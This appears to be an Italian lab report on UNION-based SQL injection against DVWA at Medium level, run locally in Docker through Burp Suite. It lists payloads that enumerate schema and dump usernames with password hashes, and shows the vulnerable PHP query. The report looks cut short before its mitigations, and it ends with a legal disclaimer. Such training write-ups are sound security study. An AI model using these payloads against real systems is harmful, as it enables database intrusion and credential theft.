# 🔐 DVWA SQL Injection - Security Level: Medium | Lab Report
**Autore:** Leonardo Sorrentini
**Data:** Maggio 2026  
**Ambiente:** Kali Linux | Docker | DVWA | Burp Suite Community  
**Target:** `http://127.0.0.1/vulnerabilities/sqli/`  
**Livello:** `Medium`

---

## 🎯 Obiettivo
Dimostrare il bypass delle contromisure lato client e della sanitizzazione di base in DVWA (livello Medium), sfruttando una vulnerabilità **SQL Injection UNION-based** tramite intercettazione HTTP. Documentare payload, metodologia di test, analisi root-cause e relative mitigazioni di sviluppo sicuro.

---

## 🛠️ Configurazione Ambiente
- **OS:** Kali Linux (Rolling)
- **Target:** `docker run --rm -d -p 80:80 vulnerables/web-dvwa`
- **Proxy:** Burp Suite (`127.0.0.1:8080`, Intercept attivo)
- **Browser:** Chromium integrato in Burp (proxy preconfigurato)
- **Isolamento:** Rete localhost, nessun accesso esterno, test eseguiti su infrastruttura di proprietà.

---

## 🔍 Low vs Medium: Cosa Cambia?
| Aspetto | Low | Medium |
|---------|-----|--------|
| Metodo HTTP | `GET` (parametro in URL) | `POST` (parametro nel corpo) |
| Interfaccia | Campo di testo libero | Menu a tendina (`<select>`) |
| "Protezione" | Nessuna | `mysqli_real_escape_string()` + Dropdown HTML |
| Vettore di attacco | Modifica diretta URL/campo | Intercettazione proxy + modifica richiesta POST |

---

## 📋 Metodologia di Test
1. Avviare Burp Suite → `Proxy → Open browser` (browser preconfigurato)
2. Attivare `Proxy → Intercept → Intercept is on`
3. In DVWA (Medium), selezionare `1` dal menu e cliccare `Submit`
4. Burp blocca la richiesta POST. Trovare: `id=1&Submit=Submit`
5. Sostituire `id=1` con il payload desiderato, mantenendo `&Submit=Submit`
6. Cliccare `Forward` → osservare il risultato nel browser
7. Ripetere per estrarre metadata e dati sensibili

---

## 💉 Payload & Risultati

| Payload (`id=`) | Output | Significato |
|:---|:---|:---|
| `1 UNION SELECT version(), database()#` | `10.1.26-MariaDB...` \| `dvwa` | Versione DBMS e nome database corrente |
| `1 UNION SELECT null, table_name FROM information_schema.tables#` | `users`, `guestbook`... | Lista tabelle tramite dizionario dati interno |
| `1 UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'#` | `user_id`, `user`, `password`... | Struttura tabella `users` |
| `1 UNION SELECT user, password FROM users#` | `admin` \| `5f4dcc3b...` | Dump username + hash MD5 password |

> ⚠️ **Nota:** Se il server restituisce errore, sostituire `#` con `%23` o `-- ` (doppio trattino + spazio). Alcuni parser POST interpretano `#` come frammento URL.

---

## 🧠 Perché le "Protezioni" di Medium Falliscono?

### 🔹 1. Menu a tendina = Solo Lato Client
Il `<select>` HTML esiste solo nel browser. Burp intercetta la richiesta **dopo** che il client l'ha assemblata, rendendo irrilevante qualsiasi vincolo grafico o JavaScript.

### 🔹 2. `mysqli_real_escape_string()` Inefficace
Il backend PHP esegue:
```php
$id = mysqli_real_escape_string($link, $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";

"Tutte le attività documentate sono state eseguite esclusivamente su infrastruttura di proprietà personale, in ambiente containerizzato e isolato, senza alcun accesso, modifica o esposizione di sistemi o dati di terzi. Lo scopo è puramente formativo, conforme alle linee guida OWASP, alle best practice di penetration testing etico e alla normativa vigente in materia di cybersecurity (es. Art. 615-ter c.p., GDPR per la gestione sicura dei dati)."
